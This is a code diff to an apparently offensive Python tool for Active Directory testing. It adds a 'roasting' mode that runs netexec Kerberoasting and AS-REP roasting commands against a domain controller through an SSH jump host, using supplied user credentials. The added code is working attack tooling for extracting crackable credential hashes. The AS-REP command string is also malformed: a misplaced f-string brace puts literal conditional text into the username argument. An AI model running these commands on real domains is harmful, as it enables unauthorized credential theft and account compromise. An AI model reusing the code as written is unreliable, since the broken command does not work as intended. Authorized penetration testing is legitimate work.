@@ -224,14 +224,10 @@ def checker(host):
         print(results[1])
         # print(targets)
         
-def kerberoasting():
-    None
-
 def en_users(jh, dc_ip, user, password, domain):
     domain = domain.split('.')
 
     dns = ''
-    print(domain)
     for item in domain:
         if len(dns) == 0:
             dns += 'dc='+item
@@ -248,6 +244,14 @@ def en_users(jh, dc_ip, user, password, domain):
     print(command2)
 
 
+def roasting(jh, dc_ip, user, password, domain):
+    kerb_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} -kdcHost {dc_ip} --kerberoasting"
+    asrep_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0]} if '@' in user else user' -p '{password}' -d {domain} -kdcHost {dc_ip} --asreproast"
+
+    run_ssh_command(jh, kerb_cmd)
+    run_ssh_command(jh, asrep_cmd)
+
+    
 
 def main():
     parser = argparse.ArgumentParser(description="Run nmap scan in tmux on remote host")
@@ -273,7 +277,14 @@ def main():
     users_parser.add_argument("-password", "-p", required=True, help="Ehm Password of that user?")
     users_parser.add_argument("-domain", "-d", required=True, help="target domain. Example: marvel.local")
 
-    
+    roasting_parser = subparsers.add_parser("roasting", help="ASREPRoasting and Kerberoasting on the target AD domain.")
+    roasting_parser.add_argument("-jumphost", "-jh", required=True, help="SSH host to run the command from")
+    roasting_parser.add_argument("-dc-ip", "-dc", required=True, help="Target DC or AD machine IP")
+    roasting_parser.add_argument("-user", "-u", required=True, help="Active Directory user. Example: admin@marvel.local")
+    roasting_parser.add_argument("-password", "-p", required=True, help="Ehm Password of that user?")
+    roasting_parser.add_argument("-domain", "-d", required=True, help="target domain. Example: marvel.local")    
+
+
     # parser.add_argument("mode", choices=["launch-scans", "monitor-scans", "scan-results", "start-responder", "parse-scans", "users"], help=" select one of the following <launch|monitor|results>")
     # parser.add_argument("config_file", help="Path to YAML configuration file")
 
@@ -310,7 +321,9 @@ def main():
 
     if args.mode == 'users':
         en_users(args.jumphost, args.dc_ip, args.user, args.password, args.domain)
-        
-        
+
+    if args.mode == 'roasting':
+        roasting(args.jumphost, args.dc_ip, args.user, args.password, args.domain)        
+
 if __name__ == "__main__":
     main()
